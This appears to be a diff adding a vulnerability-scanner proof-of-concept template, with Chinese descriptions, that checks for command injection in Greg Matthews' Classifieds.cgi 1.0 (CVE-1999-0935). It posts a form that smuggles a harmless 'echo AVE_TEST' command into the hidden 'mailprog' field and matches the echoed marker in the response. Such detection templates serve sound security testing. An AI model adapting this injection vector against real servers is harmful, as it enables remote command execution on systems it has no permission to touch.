@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 Classifieds.cgi 1.0 是否对 mailprog 隐藏变量缺乏过滤。发送 POST 请求将 mailprog 设为恶意命令，若脚本执行该命令则存在漏洞。"
+id = "POC-AVE-1999-1314"
+name = "Greg Matthews Classifieds.cgi 1.0 远程命令注入 PoC"
+severity = "critical"
+tags = ["ave-1999-1314"]
+vuln_id = [
+    "CVE-1999-0935",
+    "AVE-1999-1314",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/classifieds.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "ClassifiedsDir=/home/httpd/html/class/ads/&ViewDir=http://victim.com/class/ads/&ErrorReturn=http://victim.com/class/index.html&ReturnURL=http://victim.com/class/hi.html&return=test@test.com&mailprog=echo%20AVE_TEST"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
